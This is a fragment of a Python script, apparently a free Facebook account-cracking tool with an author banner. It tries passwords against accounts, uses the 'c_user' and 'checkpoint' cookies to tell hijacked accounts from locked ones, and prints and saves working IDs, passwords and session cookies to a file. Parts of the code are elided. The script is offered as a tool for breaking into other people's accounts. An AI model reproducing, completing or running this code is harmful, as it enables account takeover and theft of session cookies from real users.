...
\033[1;97m====================================================
[+] AUTHOR    : ZABIULLAH BAGHLANI
[+] FACEBOOK  : RAYESS ASHKAR BAGHLANI
[+] TOOLS     : FREE
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[ZABI -OK] '+cid+' | '+ps+'\033[0;97m\n[]\033[0;37m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('ZABI-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[ZABI-CP] '+uid+' | '+ps+'\x1b[1;97m')
